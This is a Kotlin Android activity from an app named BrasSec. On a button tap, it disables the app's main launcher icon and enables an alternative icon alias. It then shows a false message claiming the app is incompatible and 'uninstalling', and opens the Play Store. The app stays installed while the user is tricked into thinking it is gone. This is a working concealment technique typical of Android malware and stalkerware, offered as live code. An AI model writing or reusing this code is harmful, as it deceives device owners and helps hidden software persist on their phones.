package com.BrasSec

import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.os.SystemClock
import android.util.Log
import android.widget.Button
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity


class SecondActivity() : AppCompatActivity(){

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.instrucoes)
        var botao = findViewById<Button>(R.id.button2)

        botao.setOnClickListener(){

            val packageManager = applicationContext.packageManager

// Desativa o ícone padrão
            packageManager.setComponentEnabledSetting(
                ComponentName(applicationContext.packageName, "com.BrasSec.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

// Ativa o ícone alternativo
            packageManager.setComponentEnabledSetting(
                ComponentName(applicationContext.packageName, "com.BrasSec.Icon1"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            Toast.makeText(applicationContext,"Esse app e incompativel com seu sistema android, desinstalando....", Toast.LENGTH_LONG).show()
            SystemClock.sleep(2500)


            val intentPlay = Intent().apply {
                setClassName("com.android.vending", "com.google.android.finsky.activities.MainActivity")
            }
            startActivityForResult(intentPlay, 123) // Escolha um código de requisição

            finish()


        }

    }

}